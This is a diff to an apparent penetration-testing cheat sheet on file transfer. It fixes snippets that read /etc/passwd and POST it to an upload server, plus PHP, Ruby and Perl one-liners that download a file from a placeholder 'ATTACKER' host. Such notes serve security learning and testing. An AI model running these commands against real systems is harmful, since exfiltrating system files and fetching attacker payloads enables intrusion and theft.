@@ -33,7 +33,7 @@ URL = "http://192.168.49.128:8000/upload"
 # Define the file we want to read, open it and save it in a variable. 
 file = open("/etc/passwd","rb") 
 # Use a requests POST request to upload the file. 
-r = requests.post(url,files={"files":file})
+r = requests.post(URL,files={"files":file})
 ```
 
 ---
@@ -45,8 +45,7 @@ r = requests.post(url,files={"files":file})
 - file_get_contents() & file_put_contents()
 
 ```bash
-$file = file_get_contents("http://ATTACKER/file"); 
-file_put_contents("file", $file);
+php -r '$file = file_get_contents("http://ATTACKER/file"); file_put_contents("file", $file);'
 ```
 ---
 
@@ -58,7 +57,7 @@ ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("http://
 ```
 
 ```bash
-perl -e 'use LWP::Simple; getstore("[http://ATTACKER/file](http://ATTACKER/file)", "file");'
+perl -e 'use LWP::Simple; getstore("http://ATTACKER/file", "file");'
 ```
 
 ---
